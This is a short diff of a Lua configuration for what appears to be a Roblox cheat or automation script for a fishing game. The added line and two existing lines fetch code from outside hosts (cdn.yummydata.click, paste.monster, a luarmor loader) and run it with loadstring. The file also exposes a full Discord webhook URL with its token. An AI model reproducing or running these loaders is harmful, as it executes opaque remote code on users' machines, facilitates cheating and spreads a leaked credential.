@@ -1,3 +1,4 @@
+_G.Config={UserID="a675440d-51e7-4396-a617-504754c4658e",discord_id="1206257142630195233",Note="moniccans"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/fishit"))()end)if s then break end wait(5)end
 getgenv().WebhookFishTier = {"Secret"}
 getgenv().DiscordUser = "1206257142630195233" -- Discord User ID
 getgenv().WebhookURL = "https://discordapp.com/api/webhooks/1458049889706447030/rSlUa8fEW5E1-Jp3ckxXUv0n4GFtBlDOe6RufTrPwJ2dxHjzUjg1xzgjmzVRgFIpfibw" -- Change with your webhook!
@@ -31,4 +32,5 @@ getgenv().HideFishCaughtNotification = true
 loadstring(game:HttpGet("https://paste.monster/lwDAcZvahN9G/raw/"))()
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a8610f838de809840c5bdba17fc7047b.lua"))()
+
 
